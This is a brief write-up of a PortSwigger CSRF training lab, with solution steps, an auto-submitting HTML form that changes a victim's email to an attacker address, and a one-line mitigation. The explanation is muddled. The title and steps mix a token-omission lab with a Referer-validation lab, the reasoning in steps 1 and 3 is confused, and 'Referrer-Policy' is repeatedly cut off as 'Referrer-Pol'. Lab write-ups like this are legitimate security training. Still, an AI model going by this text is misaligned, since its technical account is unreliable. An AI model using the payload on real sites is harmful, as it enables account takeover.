# Lab 05 — CSRF referer validation depends on token being present

> **Expert** · [Official lab](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)

**Entry point:** the app falls back to Referer validation **only when the
CSRF token is absent**.

## Solution

1. In Repeater, confirm a tampered `csrf` value is rejected — but **deleting
   the parameter entirely** is accepted (Referer check then passes, because
   the request came from the site itself).
2. For the exploit, the Referer must contain the site's hostname. Drop the
   token and force the Referer with a `meta` tag (Referrer-Pol headers can't
   add arbitrary values, but `meta name="referrer"` + a path trick can):

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil-you.net">
</form>
<meta name="referrer" content="unsafe-url">
<script>document.forms[0].submit();</script>
```

3. If the Referer's origin alone is insufficient (validation wants the
   hostname anywhere in the header), keep the exploit **path** containing the
   domain: name the exploit page `/attacker@YOUR-LAB-ID.web-security-academy.net`
   and enable `Referrer-Pol: unsafe-url` so the full URL is sent.
4. Deliver to victim — lab solved.

## Mitigation

Validate the token independently of the Referer; treat Referer checks as a
defense-in-depth layer only.
